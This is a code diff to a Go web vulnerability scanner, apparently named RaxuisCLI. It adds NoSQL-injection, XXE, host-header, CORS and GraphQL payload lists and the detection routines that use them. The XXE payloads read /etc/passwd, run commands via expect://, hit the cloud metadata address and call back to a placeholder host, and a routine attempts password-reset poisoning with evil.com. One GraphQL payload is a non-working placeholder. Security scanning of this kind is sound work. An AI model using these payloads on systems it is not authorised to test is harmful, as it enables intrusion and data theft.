@@ -16,14 +16,20 @@ import (
 type VulnType string
 
 const (
-	VulnXSS     VulnType = "XSS"
-	VulnSQLi    VulnType = "SQLi"
-	VulnLFI     VulnType = "LFI"
-	VulnRFI     VulnType = "RFI"
-	VulnSSRF    VulnType = "SSRF"
-	VulnCmdInj  VulnType = "Command Injection"
-	VulnHeaders VulnType = "Security Headers"
-	VulnOpen    VulnType = "Open Redirect"
+	VulnXSS        VulnType = "XSS"
+	VulnSQLi       VulnType = "SQLi"
+	VulnLFI        VulnType = "LFI"
+	VulnRFI        VulnType = "RFI"
+	VulnSSRF       VulnType = "SSRF"
+	VulnCmdInj     VulnType = "Command Injection"
+	VulnHeaders    VulnType = "Security Headers"
+	VulnOpen       VulnType = "Open Redirect"
+	VulnCORS       VulnType = "CORS Misconfiguration"
+	VulnNoSQLi     VulnType = "NoSQL Injection"
+	VulnXXE        VulnType = "XXE"
+	VulnGraphQL    VulnType = "GraphQL Security"
+	VulnHostHeader VulnType = "Host Header Injection"
+	VulnRace       VulnType = "Race Condition"
 )
 
 // Severity levels
@@ -274,6 +280,121 @@ var OpenRedirectPayloads = []string{
 	"////evil.com/",
 	"https://evil.com/redirect",
 	"//evil%E3%80%82com",
+}
+
+// NoSQLi Payloads - MongoDB focused
+var NoSQLiPayloads = map[int][]string{
+	1: { // Basic
+		`{"$ne": ""}`,
+		`{"$gt": ""}`,
+		`[$ne]=1`,
+	},
+	2: { // Normal
+		`{"$ne": ""}`,
+		`{"$gt": ""}`,
+		`{"$ne": null}`,
+		`{"$exists": true}`,
+		`{"$regex": ".*"}`,
+		`[$ne]=1`,
+		`[$gt]=`,
+		`[$exists]=true`,
+		`{"$or": [{}]}`,
+		`{"$and": [{}]}`,
+	},
+	3: { // Aggressive
+		`{"$ne": ""}`,
+		`{"$gt": ""}`,
+		`{"$ne": null}`,
+		`{"$exists": true}`,
+		`{"$regex": ".*"}`,
+		`{"$regex": "^a"}`,
+		`{"$where": "1==1"}`,
+		`{"$where": "sleep(5000)"}`,
+		`[$ne]=1`,
+		`[$gt]=`,
+		`[$exists]=true`,
+		`[$regex]=.*`,
+		`[$where]=1==1`,
+		`{"$or": [{}]}`,
+		`{"$and": [{}]}`,
+		`{"$nin": []}`,
+		`{"$in": []}`,
+		`||1==1`,
+		`'||'1'=='1`,
+		`admin' || '1'=='1`,
+	},
+}
+
+// XXE Payloads
+var XXEPayloads = []string{
+	// Basic file disclosure
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
+
+	// OOB XXE
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK/xxe">]><foo>&xxe;</foo>`,
+
+	// Parameter entity
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK/xxe.dtd">%xxe;]><foo>test</foo>`,
+
+	// Error-based XXE
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>`,
+
+	// PHP wrapper
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
+
+	// Expect wrapper
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
+
+	// SSRF via XXE
+	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
+}
+
+// GraphQL introspection queries
+var GraphQLQueries = map[string]string{
+	"introspection_full":   `{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}`,
+	"introspection_simple": `{"query":"{__schema{types{name fields{name}}}}"}`,
+	"type_query":           `{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}`,
+	"query_type":           `{"query":"{__schema{queryType{fields{name}}}}"}`,
+	"mutation_type":        `{"query":"{__schema{mutationType{fields{name}}}}"}`,
+}
+
+// GraphQL DoS queries (nested)
+var GraphQLDoSQueries = []string{
+	`{"query":"query{__typename ".repeat(100)+"}"}`, // Placeholder for actual nested query
+	`{"query":"{a]}}"}`,                             // Field suggestion exploitation
+}
+
+// Host Header attack payloads
+var HostHeaderPayloads = []struct {
+	Header string
+	Value  string
+	Desc   string
+}{
+	{"Host", "evil.com", "Basic host header override"},
+	{"Host", "localhost", "Localhost bypass"},
+	{"Host", "127.0.0.1", "Loopback bypass"},
+	{"X-Forwarded-Host", "evil.com", "X-Forwarded-Host injection"},
+	{"X-Host", "evil.com", "X-Host injection"},
+	{"X-Forwarded-Server", "evil.com", "X-Forwarded-Server injection"},
+	{"X-Original-URL", "/admin", "X-Original-URL injection"},
+	{"X-Rewrite-URL", "/admin", "X-Rewrite-URL injection"},
+	{"Host", "target.com:evil.com", "Port-based host injection"},
+	{"Host", "target.com@evil.com", "User-based host injection"},
+	{"Host", "evil.com#target.com", "Fragment-based injection"},
+	{"Host", "target.com\r\nX-Injected: header", "CRLF in host"},
+}
+
+// CORS test origins
+var CORSTestOrigins = []string{
+	"null",
+	"https://evil.com",
+	"https://attacker.com",
+	"https://TARGETDOMAIN.evil.com",     // Subdomain of attacker
+	"https://TARGETDOMAINevil.com",      // Prefix match bypass
+	"https://evil.TARGETDOMAIN",         // Suffix match bypass
+	"https://eviltargetdomain.com",      // Contains match bypass
+	"https://TARGETDOMAIN.com.evil.com", // Domain in subdomain
 }
 
 // SQL error patterns
@@ -677,6 +798,1039 @@ func TestOpenRedirect(opts ScanOptions, resultChan chan<- VulnResult) {
 	}
 }
 
+// CORSOptions holds CORS testing configuration
+type CORSOptions struct {
+	ScanOptions
+	TestOrigin string
+	Full       bool
+}
+
+// CORSResult holds CORS test results
+type CORSResult struct {
+	VulnResult
+	AllowOrigin      string
+	AllowCredentials bool
+	AllowMethods     string
+	AllowHeaders     string
+	ExposeHeaders    string
+}
+
+// TestCORS tests for CORS misconfiguration vulnerabilities
+func TestCORS(opts CORSOptions, resultChan chan<- VulnResult) {
+	client := createClient(opts.ScanOptions)
+
+	origins := CORSTestOrigins
+	if opts.TestOrigin != "" {
+		origins = []string{opts.TestOrigin}
+	}
+
+	// Extract target domain for dynamic payloads
+	parsedURL, err := url.Parse(opts.URL)
+	if err != nil {
+		return
+	}
+	targetDomain := parsedURL.Hostname()
+
+	for _, origin := range origins {
+		// Replace TARGETDOMAIN placeholder
+		testOrigin := strings.ReplaceAll(origin, "TARGETDOMAIN", targetDomain)
+
+		req, err := http.NewRequest("OPTIONS", opts.URL, nil)
+		if err != nil {
+			continue
+		}
+
+		req.Header.Set("Origin", testOrigin)
+		req.Header.Set("Access-Control-Request-Method", "GET")
+
+		if opts.UserAgent != "" {
+			req.Header.Set("User-Agent", opts.UserAgent)
+		} else {
+			req.Header.Set("User-Agent", "RaxuisCLI-VulnScanner/1.0")
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
+		allowCreds := resp.Header.Get("Access-Control-Allow-Credentials")
+		allowMethods := resp.Header.Get("Access-Control-Allow-Methods")
+		resp.Body.Close()
+
+		// Check for vulnerabilities
+		if allowOrigin == "*" {
+			severity := SeverityMedium
+			desc := "CORS allows any origin (*). This may expose sensitive data to any website."
+			if allowCreds == "true" {
+				severity = SeverityCritical
+				desc = "CORS allows any origin (*) WITH credentials. This is a critical misconfiguration."
+			}
+			resultChan <- VulnResult{
+				Type:        VulnCORS,
+				Severity:    severity,
+				URL:         opts.URL,
+				Parameter:   "Access-Control-Allow-Origin",
+				Payload:     testOrigin,
+				Evidence:    fmt.Sprintf("Allow-Origin: %s, Allow-Credentials: %s", allowOrigin, allowCreds),
+				Description: desc,
+				Remediation: "Implement a strict allowlist of trusted origins. Avoid using wildcard (*) with credentials.",
+			}
+		} else if allowOrigin == testOrigin {
+			// Origin is reflected
+			severity := SeverityHigh
+			desc := fmt.Sprintf("CORS reflects the Origin header (%s) without validation.", testOrigin)
+			if allowCreds == "true" {
+				severity = SeverityCritical
+				desc = fmt.Sprintf("CORS reflects Origin (%s) WITH credentials enabled. Sensitive data can be stolen.", testOrigin)
+			}
+			resultChan <- VulnResult{
+				Type:        VulnCORS,
+				Severity:    severity,
+				URL:         opts.URL,
+				Parameter:   "Access-Control-Allow-Origin",
+				Payload:     testOrigin,
+				Evidence:    fmt.Sprintf("Origin reflected: %s, Credentials: %s, Methods: %s", allowOrigin, allowCreds, allowMethods),
+				Description: desc,
+				Remediation: "Validate Origin against a strict allowlist. Do not reflect arbitrary origins.",
+			}
+		} else if testOrigin == "null" && allowOrigin == "null" {
+			resultChan <- VulnResult{
+				Type:        VulnCORS,
+				Severity:    SeverityHigh,
+				URL:         opts.URL,
+				Parameter:   "Access-Control-Allow-Origin",
+				Payload:     "null",
+				Evidence:    fmt.Sprintf("Null origin accepted: %s", allowOrigin),
+				Description: "CORS accepts 'null' origin. This can be exploited via sandboxed iframes or data: URIs.",
+				Remediation: "Do not allow 'null' as a valid origin. Remove it from the allowlist.",
+			}
+		}
+	}
+
+	// Also test with a simple GET request if --full
+	if opts.Full {
+		for _, origin := range origins {
+			testOrigin := strings.ReplaceAll(origin, "TARGETDOMAIN", targetDomain)
+
+			req, err := http.NewRequest("GET", opts.URL, nil)
+			if err != nil {
+				continue
+			}
+			req.Header.Set("Origin", testOrigin)
+
+			if opts.UserAgent != "" {
+				req.Header.Set("User-Agent", opts.UserAgent)
+			}
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+
+			allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
+			allowCreds := resp.Header.Get("Access-Control-Allow-Credentials")
+			resp.Body.Close()
+
+			if allowOrigin != "" && (allowOrigin == "*" || allowOrigin == testOrigin) {
+				resultChan <- VulnResult{
+					Type:        VulnCORS,
+					Severity:    SeverityMedium,
+					URL:         opts.URL,
+					Parameter:   "GET Request CORS",
+					Payload:     testOrigin,
+					Evidence:    fmt.Sprintf("Allow-Origin: %s, Allow-Credentials: %s", allowOrigin, allowCreds),
+					Description: "CORS headers present on GET request, not just preflight.",
+					Remediation: "Review CORS configuration for all request types.",
+				}
+				break
+			}
+		}
+	}
+}
+
+// NoSQLiOptions holds NoSQL injection testing configuration
+type NoSQLiOptions struct {
+	ScanOptions
+	Data   string
+	DBType string // mongodb, couchdb, etc.
+	IsJSON bool
+}
+
+// TestNoSQLi tests for NoSQL injection vulnerabilities
+func TestNoSQLi(opts NoSQLiOptions, resultChan chan<- VulnResult) {
+	payloads := NoSQLiPayloads[opts.PayloadLevel]
+	if payloads == nil {
+		payloads = NoSQLiPayloads[2]
+	}
+
+	client := createClient(opts.ScanOptions)
+	parsedURL, err := url.Parse(opts.URL)
+	if err != nil {
+		return
+	}
+
+	// Test URL parameters
+	params := parsedURL.Query()
+	for param := range params {
+		for _, payload := range payloads {
+			// Skip JSON payloads for URL params, use bracket notation
+			if strings.HasPrefix(payload, "{") {
+				continue
+			}
+
+			testURL := buildTestURL(parsedURL, param+payload, "1")
+			start := time.Now()
+			resp, body, err := doRequest(client, testURL, opts.ScanOptions)
+			elapsed := time.Since(start)
+			if err != nil {
+				continue
+			}
+			resp.Body.Close()
+
+			// Check for NoSQL-specific errors
+			nosqlErrors := []string{
+				"MongoError",
+				"MongoDB",
+				"$where",
+				"BSON",
+				"Mongoose",
+				"CastError",
+				"ObjectId",
+				"BSONObj",
+				"JsonParseException",
+				"invalid operator",
+				"unknown operator",
+				"bad query",
+			}
+
+			for _, errPattern := range nosqlErrors {
+				if strings.Contains(body, errPattern) {
+					resultChan <- VulnResult{
+						Type:        VulnNoSQLi,
+						Severity:    SeverityHigh,
+						URL:         testURL,
+						Parameter:   param,
+						Payload:     payload,
+						Evidence:    fmt.Sprintf("NoSQL error detected: %s", errPattern),
+						Description: "NoSQL Injection vulnerability detected. The application reveals NoSQL errors.",
+						Remediation: "Use parameterized queries. Validate and sanitize all user input. Never use user input in query operators.",
+					}
+					break
+				}
+			}
+
+			// Time-based detection for $where payloads
+			if strings.Contains(payload, "sleep") && elapsed > 4*time.Second {
+				resultChan <- VulnResult{
+					Type:        VulnNoSQLi,
+					Severity:    SeverityCritical,
+					URL:         testURL,
+					Parameter:   param,
+					Payload:     payload,
+					Evidence:    fmt.Sprintf("Response delayed: %v (time-based injection)", elapsed),
+					Description: "Time-based NoSQL Injection detected via $where clause.",
+					Remediation: "Disable $where queries. Use parameterized queries only.",
+				}
+			}
+		}
+	}
+
+	// Test JSON body if provided
+	if opts.Data != "" && opts.IsJSON {
+		for _, payload := range payloads {
+			if !strings.HasPrefix(payload, "{") {
+				continue
+			}
+
+			// Try to inject payload into JSON values
+			modifiedData := injectNoSQLPayload(opts.Data, payload)
+			if modifiedData == "" {
+				continue
+			}
+
+			req, err := http.NewRequest("POST", opts.URL, strings.NewReader(modifiedData))
+			if err != nil {
+				continue
+			}
+			req.Header.Set("Content-Type", "application/json")
+
+			if opts.UserAgent != "" {
+				req.Header.Set("User-Agent", opts.UserAgent)
+			}
+
+			start := time.Now()
+			resp, err := client.Do(req)
+			elapsed := time.Since(start)
+			if err != nil {
+				continue
+			}
+
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			// Check for authentication bypass indicators
+			bypassIndicators := []string{
+				"logged in",
+				"welcome",
+				"dashboard",
+				"success",
+				"authenticated",
+				"admin",
+				"token",
+			}
+
+			for _, indicator := range bypassIndicators {
+				if strings.Contains(strings.ToLower(string(body)), indicator) {
+					resultChan <- VulnResult{
+						Type:        VulnNoSQLi,
+						Severity:    SeverityCritical,
+						URL:         opts.URL,
+						Parameter:   "JSON body",
+						Payload:     payload,
+						Evidence:    fmt.Sprintf("Possible auth bypass, found: %s", indicator),
+						Description: "NoSQL Injection may allow authentication bypass using operator injection.",
+						Remediation: "Sanitize JSON input. Reject objects with $ operators in user input.",
+					}
+					break
+				}
+			}
+
+			// Time-based check
+			if strings.Contains(payload, "sleep") && elapsed > 4*time.Second {
+				resultChan <- VulnResult{
+					Type:        VulnNoSQLi,
+					Severity:    SeverityCritical,
+					URL:         opts.URL,
+					Parameter:   "JSON body",
+					Payload:     payload,
+					Evidence:    fmt.Sprintf("Time-based injection: %v delay", elapsed),
+					Description: "Time-based NoSQL Injection via JSON body.",
+					Remediation: "Disable $where. Validate all JSON input strictly.",
+				}
+			}
+		}
+	}
+}
+
+// XXEOptions holds XXE testing configuration
+type XXEOptions struct {
+	ScanOptions
+	OOBCallback string
+	PayloadType string // file, oob, error
+}
+
+// TestXXE tests for XML External Entity vulnerabilities
+func TestXXE(opts XXEOptions, resultChan chan<- VulnResult) {
+	client := createClient(opts.ScanOptions)
+
+	for _, payload := range XXEPayloads {
+		// Replace callback placeholder if provided
+		testPayload := payload
+		if opts.OOBCallback != "" {
+			testPayload = strings.ReplaceAll(payload, "CALLBACK", opts.OOBCallback)
+		} else {
+			// Skip OOB payloads if no callback provided
+			if strings.Contains(payload, "CALLBACK") {
+				continue
+			}
+		}
+
+		// Filter by payload type if specified
+		if opts.PayloadType != "" {
+			switch opts.PayloadType {
+			case "file":
+				if !strings.Contains(payload, "file://") {
+					continue
+				}
+			case "oob":
+				if !strings.Contains(payload, "http://") {
+					continue
+				}
+			case "error":
+				if !strings.Contains(payload, "nonexistent") {
+					continue
+				}
+			}
+		}
+
+		req, err := http.NewRequest("POST", opts.URL, strings.NewReader(testPayload))
+		if err != nil {
+			continue
+		}
+
+		req.Header.Set("Content-Type", "application/xml")
+		if opts.UserAgent != "" {
+			req.Header.Set("User-Agent", opts.UserAgent)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		bodyStr := string(body)
+
+		// Check for file disclosure indicators
+		xxeIndicators := []struct {
+			pattern  string
+			severity Severity
+			desc     string
+		}{
+			{"root:x:0:0:", SeverityCritical, "XXE file disclosure: /etc/passwd contents leaked"},
+			{"[extensions]", SeverityCritical, "XXE file disclosure: Windows win.ini contents leaked"},
+			{"[boot loader]", SeverityCritical, "XXE file disclosure: Windows boot.ini contents leaked"},
+			{"<?php", SeverityCritical, "XXE file disclosure: PHP source code leaked"},
+			{"PD9waHA", SeverityHigh, "XXE with PHP filter: base64-encoded PHP source"},
+			{"uid=", SeverityCritical, "XXE command execution via expect://"},
+		}
+
+		for _, indicator := range xxeIndicators {
+			if strings.Contains(bodyStr, indicator.pattern) {
+				resultChan <- VulnResult{
+					Type:        VulnXXE,
+					Severity:    indicator.severity,
+					URL:         opts.URL,
+					Parameter:   "XML body",
+					Payload:     truncate(testPayload, 100),
+					Evidence:    fmt.Sprintf("Pattern found: %s", indicator.pattern),
+					Description: indicator.desc,
+					Remediation: "Disable external entity processing. Use defused XML parsers. Set DTD processing to prohibited.",
+				}
+				break
+			}
+		}
+
+		// Check for error-based XXE indicators
+		errorIndicators := []string{
+			"SYSTEM",
+			"ENTITY",
+			"DOCTYPE",
+			"failed to load external entity",
+			"External entity",
+			"parser error",
+			"xmlParseEntityRef",
+			"Start tag expected",
+		}
+
+		for _, errInd := range errorIndicators {
+			if strings.Contains(bodyStr, errInd) {
+				resultChan <- VulnResult{
+					Type:        VulnXXE,
+					Severity:    SeverityMedium,
+					URL:         opts.URL,
+					Parameter:   "XML body",
+					Payload:     truncate(testPayload, 100),
+					Evidence:    fmt.Sprintf("XML error: %s", errInd),
+					Description: "XML parsing error exposed. The server processes XML and may be vulnerable to XXE.",
+					Remediation: "Disable external entity processing. Configure XML parser securely.",
+				}
+				break
+			}
+		}
+	}
+}
+
+// GraphQLOptions holds GraphQL testing configuration
+type GraphQLOptions struct {
+	ScanOptions
+	Introspect bool
+	DoS        bool
+}
+
+// GraphQLSchema represents introspection result
+type GraphQLSchema struct {
+	Types     []string
+	Queries   []string
+	Mutations []string
+}
+
+// TestGraphQL tests for GraphQL security issues
+func TestGraphQL(opts GraphQLOptions, resultChan chan<- VulnResult) {
+	client := createClient(opts.ScanOptions)
+
+	// Test introspection
+	introspectionQueries := []struct {
+		name  string
+		query string
+	}{
+		{"simple", GraphQLQueries["introspection_simple"]},
+		{"full", GraphQLQueries["introspection_full"]},
+		{"query_type", GraphQLQueries["query_type"]},
+		{"mutation_type", GraphQLQueries["mutation_type"]},
+	}
+
+	for _, iq := range introspectionQueries {
+		req, err := http.NewRequest("POST", opts.URL, strings.NewReader(iq.query))
+		if err != nil {
+			continue
+		}
+
+		req.Header.Set("Content-Type", "application/json")
+		if opts.UserAgent != "" {
+			req.Header.Set("User-Agent", opts.UserAgent)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		bodyStr := string(body)
+
+		// Check if introspection is enabled
+		if strings.Contains(bodyStr, "__schema") || strings.Contains(bodyStr, "__type") {
+			if strings.Contains(bodyStr, "queryType") || strings.Contains(bodyStr, "fields") {
+				severity := SeverityMedium
+				if strings.Contains(bodyStr, "mutation") || strings.Contains(bodyStr, "Mutation") {
+					severity = SeverityHigh
+				}
+
+				resultChan <- VulnResult{
+					Type:        VulnGraphQL,
+					Severity:    severity,
+					URL:         opts.URL,
+					Parameter:   "Introspection",
+					Payload:     iq.name,
+					Evidence:    "Introspection query successful - schema exposed",
+					Description: "GraphQL introspection is enabled. Attackers can enumerate the entire API schema.",
+					Remediation: "Disable introspection in production. Use allowlists for permitted queries.",
+				}
+				break
+			}
+		}
+
+		// Check for sensitive type names in schema
+		sensitiveTypes := []string{
+			"password", "secret", "token", "key", "admin",
+			"credential", "private", "internal", "debug",
+		}
+
+		bodyLower := strings.ToLower(bodyStr)
+		for _, sensitive := range sensitiveTypes {
+			if strings.Contains(bodyLower, sensitive) {
+				resultChan <- VulnResult{
+					Type:        VulnGraphQL,
+					Severity:    SeverityMedium,
+					URL:         opts.URL,
+					Parameter:   "Schema",
+					Payload:     iq.name,
+					Evidence:    fmt.Sprintf("Sensitive field found: %s", sensitive),
+					Description: "GraphQL schema exposes potentially sensitive field names.",
+					Remediation: "Review schema for sensitive data exposure. Implement proper authorization.",
+				}
+			}
+		}
+	}
+
+	// Test field suggestions (typo-based enumeration)
+	suggestionQuery := `{"query":"{user{__badfield}}"}`
+	req, _ := http.NewRequest("POST", opts.URL, strings.NewReader(suggestionQuery))
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
+	if err == nil {
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		if strings.Contains(string(body), "Did you mean") || strings.Contains(string(body), "suggestions") {
+			resultChan <- VulnResult{
+				Type:        VulnGraphQL,
+				Severity:    SeverityLow,
+				URL:         opts.URL,
+				Parameter:   "Field Suggestions",
+				Payload:     suggestionQuery,
+				Evidence:    "Server provides field suggestions on typos",
+				Description: "GraphQL server suggests field names. This aids enumeration even without introspection.",
+				Remediation: "Disable field suggestions in production GraphQL configuration.",
+			}
+		}
+	}
+
+	// Test for batching/DoS if enabled
+	if opts.DoS {
+		// Test query batching
+		batchQuery := `[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]`
+		req, _ := http.NewRequest("POST", opts.URL, strings.NewReader(batchQuery))
+		req.Header.Set("Content-Type", "application/json")
+
+		resp, err := client.Do(req)
+		if err == nil {
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			if strings.Contains(string(body), "[") && strings.Count(string(body), "__typename") >= 2 {
+				resultChan <- VulnResult{
+					Type:        VulnGraphQL,
+					Severity:    SeverityMedium,
+					URL:         opts.URL,
+					Parameter:   "Batching",
+					Payload:     "Array batch query",
+					Evidence:    "Multiple responses returned for batched queries",
+					Description: "GraphQL batching is enabled. This may allow DoS via query multiplication.",
+					Remediation: "Limit batch size. Implement query cost analysis and rate limiting.",
+				}
+			}
+		}
+
+		// Test deeply nested query (if introspection showed types)
+		nestedQuery := `{"query":"{__schema{types{name fields{name type{name fields{name type{name}}}}}}}"}`
+		req, _ = http.NewRequest("POST", opts.URL, strings.NewReader(nestedQuery))
+		req.Header.Set("Content-Type", "application/json")
+
+		start := time.Now()
+		resp, err = client.Do(req)
+		elapsed := time.Since(start)
+
+		if err == nil {
+			resp.Body.Close()
+			if elapsed > 3*time.Second {
+				resultChan <- VulnResult{
+					Type:        VulnGraphQL,
+					Severity:    SeverityHigh,
+					URL:         opts.URL,
+					Parameter:   "Query Depth",
+					Payload:     "Nested introspection",
+					Evidence:    fmt.Sprintf("Slow response: %v for nested query", elapsed),
+					Description: "GraphQL server is vulnerable to DoS via deeply nested queries.",
+					Remediation: "Implement query depth limiting. Set maximum query complexity.",
+				}
+			}
+		}
+	}
+}
+
+// HostHeaderOptions holds host header testing configuration
+type HostHeaderOptions struct {
+	ScanOptions
+	Poison bool // password reset poisoning
+	Cache  bool // web cache poisoning
+}
+
+// TestHostHeader tests for host header injection vulnerabilities
+func TestHostHeader(opts HostHeaderOptions, resultChan chan<- VulnResult) {
+	client := createClient(opts.ScanOptions)
+
+	parsedURL, err := url.Parse(opts.URL)
+	if err != nil {
+		return
+	}
+	originalHost := parsedURL.Host
+
+	for _, payload := range HostHeaderPayloads {
+		req, err := http.NewRequest("GET", opts.URL, nil)
+		if err != nil {
+			continue
+		}
+
+		// Set the malicious header
+		if payload.Header == "Host" {
+			req.Host = payload.Value
+		} else {
+			req.Header.Set(payload.Header, payload.Value)
+		}
+
+		if opts.UserAgent != "" {
+			req.Header.Set("User-Agent", opts.UserAgent)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		bodyStr := string(body)
+
+		// Check if the payload is reflected in the response
+		if strings.Contains(bodyStr, payload.Value) || strings.Contains(bodyStr, "evil.com") {
+			severity := SeverityMedium
+			if strings.Contains(strings.ToLower(bodyStr), "password") ||
+				strings.Contains(strings.ToLower(bodyStr), "reset") {
+				severity = SeverityHigh
+			}
+
+			resultChan <- VulnResult{
+				Type:        VulnHostHeader,
+				Severity:    severity,
+				URL:         opts.URL,
+				Parameter:   payload.Header,
+				Payload:     payload.Value,
+				Evidence:    fmt.Sprintf("Host header value reflected in response (%s)", payload.Desc),
+				Description: "Host header injection detected. The server uses the Host header value in the response.",
+				Remediation: "Validate Host header against allowlist. Use server-side URL generation.",
+			}
+		}
+
+		// Check Location header for redirects
+		location := resp.Header.Get("Location")
+		if location != "" {
+			if strings.Contains(location, payload.Value) || strings.Contains(location, "evil.com") {
+				resultChan <- VulnResult{
+					Type:        VulnHostHeader,
+					Severity:    SeverityHigh,
+					URL:         opts.URL,
+					Parameter:   payload.Header,
+					Payload:     payload.Value,
+					Evidence:    fmt.Sprintf("Host reflected in redirect: %s", location),
+					Description: "Host header controls redirect destination. This can be exploited for phishing or cache poisoning.",
+					Remediation: "Generate redirect URLs server-side. Do not use Host header in redirects.",
+				}
+			}
+		}
+
+		// Check for cache poisoning indicators if --cache
+		if opts.Cache {
+			cacheHeaders := []string{
+				resp.Header.Get("X-Cache"),
+				resp.Header.Get("CF-Cache-Status"),
+				resp.Header.Get("Age"),
+				resp.Header.Get("X-Cache-Hits"),
+			}
+
+			for _, ch := range cacheHeaders {
+				if ch != "" && (strings.Contains(strings.ToLower(ch), "hit") || ch != "0") {
+					if strings.Contains(bodyStr, payload.Value) {
+						resultChan <- VulnResult{
+							Type:        VulnHostHeader,
+							Severity:    SeverityCritical,
+							URL:         opts.URL,
+							Parameter:   "Cache Poisoning",
+							Payload:     fmt.Sprintf("%s: %s", payload.Header, payload.Value),
+							Evidence:    fmt.Sprintf("Cached response with injected content (Cache: %s)", ch),
+							Description: "Web cache poisoning via Host header. Malicious content may be served to other users.",
+							Remediation: "Configure cache to key on Host header. Validate Host strictly before caching.",
+						}
+					}
+					break
+				}
+			}
+		}
+	}
+
+	// Test password reset poisoning if --poison
+	if opts.Poison {
+		// Look for password reset endpoint
+		resetEndpoints := []string{
+			"/reset-password",
+			"/forgot-password",
+			"/password/reset",
+			"/account/recover",
+			"/auth/forgot",
+		}
+
+		for _, endpoint := range resetEndpoints {
+			resetURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, originalHost, endpoint)
+
+			req, err := http.NewRequest("POST", resetURL, strings.NewReader("email=test@example.com"))
+			if err != nil {
+				continue
+			}
+
+			req.Host = "evil.com"
+			req.Header.Set("X-Forwarded-Host", "evil.com")
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			// Check if response indicates a reset was triggered
+			if resp.StatusCode == 200 || resp.StatusCode == 302 {
+				if strings.Contains(strings.ToLower(string(body)), "email") ||
+					strings.Contains(strings.ToLower(string(body)), "sent") ||
+					strings.Contains(strings.ToLower(string(body)), "reset") {
+					resultChan <- VulnResult{
+						Type:        VulnHostHeader,
+						Severity:    SeverityHigh,
+						URL:         resetURL,
+						Parameter:   "Password Reset Poisoning",
+						Payload:     "Host: evil.com",
+						Evidence:    "Password reset endpoint accepts modified Host header",
+						Description: "Password reset poisoning possible. Reset links may contain attacker-controlled domain.",
+						Remediation: "Use fixed domain for password reset URLs. Never use Host header for email links.",
+					}
+				}
+			}
+		}
+	}
+}
+
+// RaceOptions holds race condition testing configuration
+type RaceOptions struct {
+	ScanOptions
+	Data       string
+	Requests   int
+	Concurrent bool
+}
+
+// RaceResult holds race condition test results
+type RaceResult struct {
+	VulnResult
+	Responses    []int // status codes
+	Inconsistent bool
+	SuccessCount int
+}
+
+// TestRaceCondition tests for race condition vulnerabilities
+func TestRaceCondition(opts RaceOptions, resultChan chan<- VulnResult) {
+	if opts.Requests <= 0 {
+		opts.Requests = 10
+	}
+
+	client := createClient(opts.ScanOptions)
+	client.Timeout = time.Duration(opts.Timeout) * time.Second
+
+	method := opts.Method
+	if method == "" {
+		method = "POST"
+	}
+
+	// Prepare all requests upfront
+	var requests []*http.Request
+	for i := 0; i < opts.Requests; i++ {
+		var body io.Reader
+		if opts.Data != "" {
+			body = strings.NewReader(opts.Data)
+		}
+
+		req, err := http.NewRequest(method, opts.URL, body)
+		if err != nil {
+			continue
+		}
+
+		if opts.UserAgent != "" {
+			req.Header.Set("User-Agent", opts.UserAgent)
+		} else {
+			req.Header.Set("User-Agent", "RaxuisCLI-RaceTest/1.0")
+		}
+
+		if opts.Cookie != "" {
+			req.Header.Set("Cookie", opts.Cookie)
+		}
+
+		for key, value := range opts.Headers {
+			req.Header.Set(key, value)
+		}
+
+		if opts.Data != "" {
+			if strings.HasPrefix(opts.Data, "{") {
+				req.Header.Set("Content-Type", "application/json")
+			} else {
+				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			}
+		}
+
+		requests = append(requests, req)
+	}
+
+	// Results collection
+	type response struct {
+		StatusCode int
+		Body       string
